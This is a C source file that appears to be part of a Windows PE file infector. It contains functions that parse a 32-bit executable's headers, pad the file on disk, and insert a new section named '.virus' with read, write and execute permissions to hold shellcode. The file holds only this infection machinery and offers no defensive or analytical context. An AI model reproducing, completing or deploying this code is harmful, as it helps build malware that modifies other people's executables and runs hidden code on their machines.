#include <Windows.h>
#include "exe.h"
#include <string.h>

#define ERROR -1
#define SUCCESS 0
#define INFECTED_SECTION_NAME ".virus"

#pragma warning(disable : 4996)

DWORD align(DWORD size, DWORD align, DWORD addr) {
    if (!(size % align))
        return addr + size;
    return addr + (size / align + 1) * align;
}

DWORD set_exe_headers(EXE_file* exe_file)
{
    /* Set the exe headers for future usage*/
    PIMAGE_SECTION_HEADER first_section_header = NULL;
    exe_file->dosHeader = exe_file->mapped_handle;
    DWORD relocation_table_end = 0;

    if (exe_file->dosHeader->e_magic != IMAGE_DOS_SIGNATURE)
    {
        printf("error in getting the right dos header\n");
        return ERROR;
    }
    exe_file->headers = exe_file->mapped_handle + exe_file->dosHeader->e_lfanew;


    if (exe_file->headers->Signature != IMAGE_NT_SIGNATURE)
    {
        printf("error in getting the right NT header\n");
        return ERROR;
    }

    if (exe_file->headers->OptionalHeader.Magic != 0x10B)
    {
        printf("this program is not 32 bit \n");
        return ERROR;
    }
    exe_file->entry_address = (DWORD)exe_file->headers->OptionalHeader.ImageBase + exe_file->headers->OptionalHeader.AddressOfEntryPoint;
    return SUCCESS;
}

DWORD get_new_section_virtual_address(EXE_file* infected)
{
    PIMAGE_SECTION_HEADER last_section = NULL;
    last_section = (PIMAGE_SECTION_HEADER)IMAGE_FIRST_SECTION(infected->headers) + (infected->headers->FileHeader.NumberOfSections - 1);
    return align(last_section->Misc.VirtualSize, infected->headers->OptionalHeader.SectionAlignment, last_section->VirtualAddress);
}

DWORD add_file_empty_place(PCHAR file_name, DWORD size_of_appned, DWORD* result_out)
{
    // Return the origianl file size.

    HANDLE file_handle = CreateFileA(file_name, // open file
        FILE_APPEND_DATA,         // open for writing
        FILE_SHARE_READ,          // allow multiple readers
        NULL,                     // no security
        OPEN_EXISTING,              // open or create
        FILE_ATTRIBUTE_NORMAL,    // normal file
        NULL);                   // no attr. template

    if (file_handle == INVALID_HANDLE_VALUE)
    {
        *result_out = ERROR;
        return 0;
    }

    DWORD original_code_size = GetFileSize(file_handle, NULL);
    printf("original file size is %d\n", original_code_size);

    // adding to be in correct alignment.
    size_of_appned = align(size_of_appned, USUALLY_FILE_ALIGN, 0);
    size_of_appned += USUALLY_FILE_ALIGN - (original_code_size % USUALLY_FILE_ALIGN);
    // Fix orginal file size.
    original_code_size = align(original_code_size, USUALLY_FILE_ALIGN, 0);
    PVOID zero_buffer = calloc(size_of_appned, 1);
    int result = 0;

    printf("add empty place to %s\n", file_name);
    result = WriteFile(file_handle, zero_buffer, size_of_appned, NULL, NULL);
    if (result == 0)
    {
        printf("error appending zeros to end of file");
        *result_out = ERROR;
        return 0;
    }
    printf("new file size is %d\n", GetFileSize(file_handle, NULL));

    CloseHandle(file_handle);
    if (zero_buffer != NULL)
    {
        free(zero_buffer);
    }
    else *result_out = ERROR;

    *result_out = SUCCESS;
    return original_code_size;
}

void create_new_section(EXE_file* infected, DWORD shellcode_size)
{
    /* Create new section at the end of the infected exe. The new infection will store the shellcode and will have execute-read-write permissions*/
    IMAGE_SECTION_HEADER new_section = { 0 };

    // Set new sections value.
    new_section.Characteristics |= IMAGE_SCN_MEM_WRITE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_EXECUTE;
    new_section.SizeOfRawData = align(shellcode_size, infected->headers->OptionalHeader.FileAlignment, 0);
    strcpy(new_section.Name, INFECTED_SECTION_NAME);
    new_section.PointerToRawData = infected->origianal_file_size;
    new_section.VirtualAddress = get_new_section_virtual_address(infected);
    new_section.Misc.VirtualSize = shellcode_size;

    DWORD new_section_address = (PIMAGE_SECTION_HEADER)IMAGE_FIRST_SECTION(infected->headers) + (infected->headers->FileHeader.NumberOfSections);
    memcpy(new_section_address, &new_section, sizeof(new_section));
    infected->headers->OptionalHeader.SizeOfImage = new_section.VirtualAddress + new_section.Misc.VirtualSize;
    infected->headers->FileHeader.NumberOfSections += 1;

    infected->infected_section = new_section_address;
}